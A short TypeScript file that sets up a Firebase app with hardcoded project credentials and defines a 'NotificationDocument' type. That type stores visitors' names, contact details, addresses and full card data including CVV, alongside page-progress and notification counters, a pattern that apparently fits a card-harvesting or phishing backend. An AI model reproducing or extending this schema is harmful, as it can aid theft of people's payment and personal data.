import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
   apiKey: "AIzaSyAlN1uJ4dUYlePaZ2GPS_CJKlspufkoSDM",
  authDomain: "jadedozaim.firebaseapp.com",
  databaseURL: "https://jadedozaim-default-rtdb.firebaseio.com",
  projectId: "jadedozaim",
  storageBucket: "jadedozaim.firebasestorage.app",
  messagingSenderId: "234913494157",
  appId: "1:234913494157:web:a4d70da6127fc37a189ec4",
  measurementId: "G-XHVP1LCG26"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}



